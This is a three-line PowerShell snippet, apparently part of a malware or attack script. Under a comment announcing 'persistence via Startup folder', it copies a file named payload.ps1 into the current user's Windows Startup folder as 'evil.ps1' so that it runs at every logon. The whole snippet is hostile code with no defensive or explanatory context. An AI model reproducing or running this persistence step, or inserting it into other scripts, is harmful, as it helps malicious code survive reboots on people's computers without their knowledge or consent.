# Add persistence via Startup folder
$payload = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1"
Copy-Item .\payload.ps1 $payload